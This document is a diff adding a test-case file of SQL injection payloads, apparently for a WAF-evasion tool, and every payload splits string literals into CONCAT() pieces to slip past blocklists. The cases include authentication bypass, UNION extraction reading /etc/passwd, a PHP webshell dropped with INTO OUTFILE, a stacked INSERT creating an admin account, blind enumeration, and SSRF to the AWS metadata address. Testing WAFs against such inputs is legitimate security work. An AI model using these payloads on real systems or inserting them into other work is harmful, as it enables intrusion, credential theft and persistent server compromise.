@@ -1,0 +1,102 @@
+schema = 1
+# SQL injection payloads pre-encoded with `sql_concat_split` — every
+# single-quoted string literal is rewritten as `CONCAT('a','b',...)`.
+# CRS and commercial WAF blocklists scan for literal substrings like
+# `'admin'`, `'password'`, `'union'`, `'/etc/passwd'`; the per-char
+# CONCAT decomposition makes the substring never appear contiguously.
+# The DB evaluates CONCAT() to the original string, so the attack
+# succeeds against MySQL, MariaDB, Postgres, MSSQL (all ship CONCAT
+# as a scalar function).
+#
+# Manual form: `wafrift evade --only tamper/sql_concat_split --payload
+# "1 OR username='admin'--"`.
+
+# ── Credential-string bypass ──
+
+[[case]]
+id = "concat_split_admin_lookup"
+class = "sql"
+payload = "1 OR username=CONCAT('a','d','m','i','n')--"
+description = "OR username='admin' — the 'admin' literal is split across 5 single-char args; literal-string blocklist misses."
+
+[[case]]
+id = "concat_split_password_compare"
+class = "sql"
+payload = "1 OR password=CONCAT('p','a','s','s','w','o','r','d')--"
+description = "Plaintext password comparison; 'password' rebuilt at exec time."
+
+[[case]]
+id = "concat_split_root_user"
+class = "sql"
+payload = "1 OR username=CONCAT('r','o','o','t')--"
+description = "Common privileged user lookup; 'root' substring blocked literally on most CRS PL3+ but reassembles after split."
+
+# ── Union-extraction with embedded literal target ──
+
+[[case]]
+id = "concat_split_union_select_admin"
+class = "sql"
+payload = "1' UNION SELECT CONCAT('a','d','m','i','n'),NULL,NULL--"
+description = "UNION SELECT 'admin',NULL,NULL — the column-value literal is split."
+
+[[case]]
+id = "concat_split_union_etc_passwd"
+class = "sql"
+payload = "1' UNION SELECT LOAD_FILE(CONCAT('/','e','t','c','/','p','a','s','s','w','d')),NULL--"
+description = "LOAD_FILE('/etc/passwd') — the path literal is decomposed; path-traversal regex on '/etc/passwd' misses."
+
+# ── INTO OUTFILE webshell drop ──
+
+[[case]]
+id = "concat_split_into_outfile_php"
+class = "sql"
+payload = "1' UNION SELECT CONCAT('<','?','p','h','p',' ','s','y','s','t','e','m','(','$','_','G','E','T','[','1',']',')',';','?','>') INTO OUTFILE CONCAT('/','v','a','r','/','w','w','w','/','s','h','.','p','h','p')--"
+description = "Classic INTO OUTFILE webshell drop. Both the PHP payload AND the destination path are CONCAT-split; the '<?php' / 'system(' / '/var/www' literals are all decomposed."
+
+# ── EXTRACTVALUE error-based with target string split ──
+
+[[case]]
+id = "concat_split_extractvalue_dbname"
+class = "sql"
+payload = "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT('d','b','n','a','m','e','=',database()))))--"
+description = "Error-based extraction with the leak-prefix literal 'dbname=' split inline."
+
+# ── INSERT into users (privilege escalation) ──
+
+[[case]]
+id = "concat_split_insert_admin_user"
+class = "sql"
+payload = "1'; INSERT INTO users (username,role) VALUES (CONCAT('a','d','m','i','n','2'),CONCAT('a','d','m','i','n','i','s','t','r','a','t','o','r'))--"
+description = "Stacked INSERT for privilege escalation; both 'admin2' username and 'administrator' role string are split."
+
+# ── Blind comparison via SUBSTRING / LIKE ──
+
+[[case]]
+id = "concat_split_like_admin_prefix"
+class = "sql"
+payload = "1 OR username LIKE CONCAT('a','d','m','%')--"
+description = "Blind LIKE prefix match — 'adm%' decomposed; common credential-enumeration regex on 'adm%' misses."
+
+# ── Hostname / IP literal split (SSRF chained with SQLi) ──
+
+[[case]]
+id = "concat_split_ssrf_metadata"
+class = "sql"
+payload = "1' UNION SELECT LOAD_FILE(CONCAT('http://','1','6','9','.','2','5','4','.','1','6','9','.','2','5','4','/','l','a','t','e','s','t','/','m','e','t','a','-','d','a','t','a','/'))--"
+description = "AWS IMDS metadata SSRF via LOAD_FILE. The 169.254.169.254 IP literal — heavily fingerprinted by SSRF rules — is decomposed."
+
+# ── Time-based blind with table-name split ──
+
+[[case]]
+id = "concat_split_blind_users_table"
+class = "sql"
+payload = "1 AND IF((SELECT COUNT(*) FROM users WHERE username=CONCAT('a','d','m','i','n'))>0,SLEEP(5),0)--"
+description = "Time-based blind verifying 'admin' user exists; the credential literal is split inside the subquery."
+
+# ── Multi-char keyword AND literal split ──
+
+[[case]]
+id = "concat_split_information_schema_with_target"
+class = "sql"
+payload = "1' UNION SELECT table_name FROM information_schema.tables WHERE table_name LIKE CONCAT('%','u','s','e','r','s','%')--"
+description = "information_schema dump filtered to tables matching '%users%' — the LIKE-pattern literal is decomposed to dodge table-name-leak rules."
